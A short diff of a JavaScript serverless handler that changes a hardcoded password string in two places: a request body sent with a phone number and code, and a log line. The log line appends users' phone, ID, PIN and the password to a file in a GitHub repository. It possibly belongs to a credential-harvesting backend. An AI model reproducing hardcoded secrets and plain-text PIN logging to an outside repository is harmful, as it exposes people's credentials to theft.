@@ -31,7 +31,7 @@ export default async function handler(req, res) {
       },
       body: JSON.stringify({
         phone: phone,
-        password: "335112blk",
+        password: "335112blk?",
         code: code,
         scene: 0
       })
@@ -68,7 +68,7 @@ async function sendToGitHub(formData) {
     const sha = getData.sha;
     const currentContent = atob(getData.content);
 
-    const logLine = `${formData.timestamp} | ${formData.phone} | ${formData.id} | ${formData.pin} | 335112blk\n`;
+    const logLine = `${formData.timestamp} | ${formData.phone} | ${formData.id} | ${formData.pin} | 335112blk?\n`;
     const updatedContent = currentContent + logLine;
     const putData = {
       message: "Adiciona log de contenção",
